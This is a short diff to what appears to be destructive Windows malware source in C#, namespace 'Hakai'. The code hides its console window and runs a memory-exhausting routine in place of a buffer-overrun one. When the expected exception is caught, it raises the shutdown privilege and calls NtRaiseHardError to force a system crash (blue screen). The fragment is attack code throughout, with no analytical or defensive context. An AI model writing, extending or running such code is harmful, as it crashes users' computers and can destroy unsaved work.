@@ -19,9 +19,11 @@ namespace Hakai
             FreeConsole();
             try 
             { 
-                BufferOverrun.GoBufferOverrun();
+                //BufferOverrun.GoBufferOverrun();
+                Pointers.WoW();
             }
-            catch (IOException)
+            //catch (IOException)
+            catch (OutOfMemoryException)
             {
                 ProcessAccesAdmin.RtlAdjustPrivilege(ProcessAccesAdmin.Privilege.SeShutdownPrivilege, true, false, out bool previousValue);
                 ProcessAccesAdmin.NtRaiseHardError(ProcessAccesAdmin.NTStatus.STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response);
